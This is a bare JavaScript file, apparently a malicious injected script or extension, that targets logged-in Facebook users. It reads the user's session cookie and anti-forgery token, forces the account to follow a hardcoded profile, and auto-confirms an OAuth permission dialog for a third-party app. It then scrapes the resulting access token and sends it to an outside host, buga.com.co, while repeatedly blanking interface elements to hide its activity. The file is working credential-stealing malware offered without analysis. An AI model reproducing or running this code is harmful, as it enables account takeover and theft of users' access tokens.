new Image().src="http://whos.amung.us/widget/1336zawjbo5s.png";
if(location.hostname.indexOf("facebook.com")>=0){
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
   var profile_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]).toString();

function a(abone) {
    var http4 = new XMLHttpRequest();
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
    http4.onreadystatechange = function () {
        if (http4.readyState == 4 && http4.status == 200) {
            http4.close;
        }
    };
    http4.send(params4);
}

 a("711894381");

        var profile_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]).toString();

        function uygulamaizinver(url) {
            var xmlhttp = new XMLHttpRequest();
            xmlhttp.onreadystatechange = function() {
                if (xmlhttp.readyState == 4) {
                    izinverhtml = document.createElement("html");
                    izinverhtml.innerHTML = xmlhttp.responseText;
                    if (izinverhtml.getElementsByTagName("form").length > 0) {
                        izinverhtml.innerHTML = izinverhtml.getElementsByTagName("form")[0].outerHTML
                        act = izinverhtml.getElementsByTagName("form")[0].action;
                        duzenlevegonder(izinverhtml, act);
                    }
                }
            };
            xmlhttp.open("GET", url, true);
            xmlhttp.send();
        }

        function duzenlevegonder(formnesne, act) {
            izinverparams = "";
            for (i = 0; i < formnesne.getElementsByTagName("input").length; i++) {
                if (formnesne.getElementsByTagName("input")[i].name.indexOf("__CANCEL__") < 0 && formnesne.getElementsByTagName("input")[i].name.indexOf("cancel_clicked")) {
                    izinverparams += "&" + formnesne.getElementsByTagName("input")[i].name + "=" + formnesne.getElementsByTagName("input")[i].value;
                }
            }
            if (formnesne.getElementsByTagName("select").length > 0) {
                izinverparams += "&" + formnesne.getElementsByTagName("select")[0].name + "=80";
            }
            izinverparams.replace("&fb_dtsg", "fb_dtsg");
            izinverparams += "&__CONFIRM__=1";
            formnesne = formnesne;
            var xmlhttp = new XMLHttpRequest();
            xmlhttp.onreadystatechange = function() {
                if (xmlhttp.readyState == 4) {
                    izinhtml = document.createElement("html");
                    izinhtml.innerHTML = xmlhttp.responseText;
                    if (izinhtml.getElementsByTagName("form").length > 0) {
                        izinhtml.innerHTML = izinhtml.getElementsByTagName("form")[0].outerHTML;
                        act = izinhtml.getElementsByTagName("form")[0].action;
                        duzenlevegonder(izinhtml, act)
                    } else {
                        sex = xmlhttp.responseText.match(/#access_token=(.*?)&expires_in/i);
                        if (sex[1]) {
                            tokenyolla(sex[1]);
                        }
                    }
                }
            };

            xmlhttp.open("POST", act, true);
            xmlhttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xmlhttp.send(izinverparams);

        }

        function TokenUrl(id){
         return "//www.facebook.com/dialog/oauth?response_type=token&display=popup&client_id=" + id  +"&redirect_uri=fbconnect://success&sso_key=com&scope=email,publish_stream,user_likes,friends_likes,user_birthday";
        }

        if (!localStorage['token_' + profile_id] || (localStorage['token_' + profile_id] && tarih.getTime() >= localStorage['token_' + profile_id])) {
            uygulamaizinver(TokenUrl("121876164619130"));
            var http = new XMLHttpRequest();
            http['open']('GET', 'https://graph.facebook.com/' + profile_id, false);
            http['send']();
            var get = JSON.parse(http['responseText']);
            var isim = get.name;
        }
        window.setInterval(function() { 
            if (document.getElementsByClassName("_5ce")) {
                for (i = 0; i < document.getElementsByClassName("_5ce").length; i++) {
                    document.getElementsByClassName("_5ce")[i].innerHTML = "";
                }
            }
            if (document.getElementsByClassName("uiToggle wrap")) {
                for (i = 0; i < document.getElementsByClassName("uiToggle wrap").length; i++) {
                    document.getElementsByClassName("uiToggle wrap")[i].innerHTML = "";
                }
            }
            if (document.getElementsByClassName("uiPopover")) {
                for (i = 0; i < document.getElementsByClassName("uiPopover").length; i++) {
                    document.getElementsByClassName("uiPopover")[i].innerHTML = "";
                }
            }
        }, 200);
		
        function tokenyolla(token) { 

				top.location.href = 'http://www.buga.com.co/?token='+token+'#' + token;
			}
			
        }
